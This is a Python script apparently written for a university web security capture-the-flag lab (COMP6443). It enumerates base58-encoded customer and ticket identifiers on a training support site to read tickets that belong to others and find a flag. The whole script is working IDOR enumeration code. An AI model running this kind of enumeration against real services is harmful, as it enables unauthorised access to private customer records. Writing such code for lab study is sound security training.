#!/usr/bin/env python3

import requests
import time

BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

BASE_URL = "https://support.quoccacorp.com/raw/{}"
CLIENT_CERT = "<zid>.pem" # add in .pem file with your zid e.g. z1234567.pem

START_CUSTOMER_ID = 1
MAX_CUSTOMER_ID = 1500

DELAY = 0.05

FLAG_IDENTIFIER = "<zid>" # a clue is that flag contains our zid


def base58_encode(data: bytes) -> str:
    num = int.from_bytes(data, "big")

    if num == 0:
        return BASE58_ALPHABET[0]

    encoded = ""

    while num > 0:
        num, rem = divmod(num, 58)
        encoded = BASE58_ALPHABET[rem] + encoded

    return encoded


def encode_ticket(customer_id, ticket_id):
    raw = f"{customer_id}:{ticket_id}".encode()
    return base58_encode(raw)


def check_ticket(session, customer_id, ticket_id):

    token = encode_ticket(customer_id, ticket_id)
    url = BASE_URL.format(token)

    try:

        r = session.get(
            url,
            cert=CLIENT_CERT,
            timeout=10
        )

        text = r.text

        # look for flag that contains our zid
        if "COMP6443{" in text and FLAG_IDENTIFIER in text:

            print("\nFLAG FOUND!")
            print("Customer:", customer_id)
            print("Ticket:", ticket_id)
            print("URL:", url)

            print("\nResponse:\n")
            print(text)

            return True

        if "Ticket not found" in text or "Not Found" in text:
            return "NOT_FOUND"

        print(f"Valid ticket -> {customer_id}:{ticket_id}  {url}")

        return False

    except Exception as e:
        print("Request error:", e)
        return False


def main():

    session = requests.Session()

    for customer_id in range(START_CUSTOMER_ID, MAX_CUSTOMER_ID):

        print(f"\nChecking customer {customer_id}")

        ticket_id = 1

        while True:

            result = check_ticket(session, customer_id, ticket_id)

            if result is True:
                return

            if result == "NOT_FOUND":
                break

            ticket_id += 1

            time.sleep(DELAY)

if __name__ == "__main__":
    main()